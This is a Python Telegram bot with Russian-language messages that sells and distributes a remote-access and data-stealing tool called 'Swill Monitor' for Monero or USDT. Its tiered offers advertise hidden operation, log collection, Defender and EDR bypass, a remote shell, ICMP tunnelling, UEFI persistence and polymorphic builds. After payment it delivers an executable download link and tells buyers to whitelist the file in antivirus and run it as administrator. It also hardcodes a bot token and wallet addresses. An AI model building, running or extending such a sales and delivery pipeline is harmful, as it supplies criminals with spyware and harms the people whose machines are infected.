import logging
import time
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

TOKEN = "8984654579:AAGaUlKtAjJd7wqR5BsaLEBMUeGKmztC-pM"

# ===== КОШЕЛЬКИ =====
MONERO_ADDRESS = "46r6fC7DptBgov3ZQPtdzJ8Ge8o1fDiqe8UPPm1BxDLC4iHrFwn32PUWTXz3qH8jdaRMzuXG3obCdEbNncoJfMDHRMQ4N91"
USDT_ADDRESS = "TEmyv3w1CjftMMbF4qxEffV8P2P3D9m8xa"

FILE_URL = "https://tmpfiles.org/wRwDSeA58F4E/blackout.exe"

# ===== ФУНКЦИЯ ПРОВЕРКИ MONERO =====
def check_monero(amount_usd):
    try:
        url = f"https://xmrchain.net/api/transactions?address={MONERO_ADDRESS}"
        r = requests.get(url, timeout=10)
        data = r.json()
        total_xmr = 0
        for tx in data.get("data", {}).get("transactions", []):
            if tx.get("direction") == "in":
                total_xmr += tx.get("amount", 0) / 1e12
        # Курс XMR/USD (примерный)
        xmr_usd = 140
        return total_xmr * xmr_usd >= amount_usd
    except:
        return False

# ===== ФУНКЦИЯ ПРОВЕРКИ USDT (TRC20) =====
def check_usdt(amount_usd):
    try:
        url = f"https://api.trongrid.io/v1/accounts/{USDT_ADDRESS}/transactions/trc20?limit=50"
        r = requests.get(url, timeout=10)
        data = r.json()
        total_usdt = 0
        for tx in data.get("data", []):
            if tx.get("type") == "Transfer" and tx.get("to") == USDT_ADDRESS:
                total_usdt += int(tx.get("value", 0)) / 1e6
        return total_usdt >= amount_usd
    except:
        return False

# ===== КОМАНДА /confirm С АВТОПРОВЕРКОЙ =====
async def confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    await update.message.reply_text("⏳ Проверяю платежи... Это может занять до 30 секунд.")

    # Проверяем Monero
    monero_ok = check_monero(50)  # для Lite
    usdt_ok = check_usdt(50)

    if monero_ok or usdt_ok:
        await update.message.reply_text(
            f"✅ Платёж подтверждён!\n"
            f"Ссылка на скачивание:\n{ FILE_URL }\n\n"
            f"📌 Ссылка активна 24 часа.\n"
            f"Инструкция: /instructions"
        )
    else:
        await update.message.reply_text(
            "❌ Платёж не найден.\n"
            "Проверьте, что вы отправили точную сумму.\n"
            "Если оплата была — подождите 10–15 минут и попробуйте снова."
        )

# ===== ОСТАЛЬНЫЕ КОМАНДЫ =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("Купить Lite — $99", callback_data="buy_lite")],
        [InlineKeyboardButton("Купить Pro — $299", callback_data="buy_pro")],
        [InlineKeyboardButton("Купить Enterprise — $999", callback_data="buy_enterprise")],
        [InlineKeyboardButton("🌐 Сайт", callback_data="site")],
        [InlineKeyboardButton("📖 Инструкция", callback_data="instructions")],
        [InlineKeyboardButton("🛠 Поддержка", callback_data="support")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "👋 Добро пожаловать в Swill Monitor!\n\nВыберите тариф:",
        reply_markup=reply_markup
    )

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "site":
        await query.edit_message_text(
            "🌐 Сайт-визитка:\nhttps://RTYT232.github.io/portfolio/\n\n"
            "Заказы: @RATNIKIPCbot"
        )
    elif data == "buy_lite":
        await query.edit_message_text(
            f"💰 Lite — $99\n\n"
            f"✅ До 5 устройств\n"
            f"✅ Базовый сбор логов\n"
            f"✅ Скрытый режим\n\n"
            f"💳 Оплата:\n"
            f"Monero (XMR):\n`{MONERO_ADDRESS}`\n\n"
            f"USDT (TRC20):\n`{USDT_ADDRESS}`\n\n"
            f"После оплаты напишите /confirm — бот проверит автоматически."
        )
    elif data == "buy_pro":
        await query.edit_message_text(
            f"💰 Pro — $299\n\n"
            f"✅ До 20 устройств\n"
            f"✅ Обход Defender\n"
            f"✅ Удалённый шелл\n"
            f"✅ ICMP-туннель\n\n"
            f"💳 Оплата:\n"
            f"Monero (XMR):\n`{MONERO_ADDRESS}`\n\n"
            f"USDT (TRC20):\n`{USDT_ADDRESS}`\n\n"
            f"После оплаты напишите /confirm — бот проверит автоматически."
        )
    elif data == "buy_enterprise":
        await query.edit_message_text(
            f"💰 Enterprise — $999\n\n"
            f"✅ Безлимит устройств\n"
            f"✅ UEFI-персистентность\n"
            f"✅ Полиморфный билд\n"
            f"✅ Обход EDR\n\n"
            f"💳 Оплата:\n"
            f"Monero (XMR):\n`{MONERO_ADDRESS}`\n\n"
            f"USDT (TRC20):\n`{USDT_ADDRESS}`\n\n"
            f"После оплаты напишите /confirm — бот проверит автоматически."
        )
    elif data == "instructions":
        await query.edit_message_text(
            "📖 Инструкция:\n\n"
            "1️⃣ Скачайте .exe\n"
            "2️⃣ Добавьте в исключения антивируса\n"
            "3️⃣ Запустите от имени администратора"
        )
    elif data == "support":
        await query.edit_message_text(
            "🛠 Напишите ваш вопрос — отвечу вручную."
        )
    else:
        await query.edit_message_text("❌ Неизвестная команда.")

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("confirm", confirm))
    app.add_handler(CallbackQueryHandler(button))
    print("✅ Бот запущен с автопроверкой платежей!")
    app.run_polling()

if __name__ == "__main__":
    main()
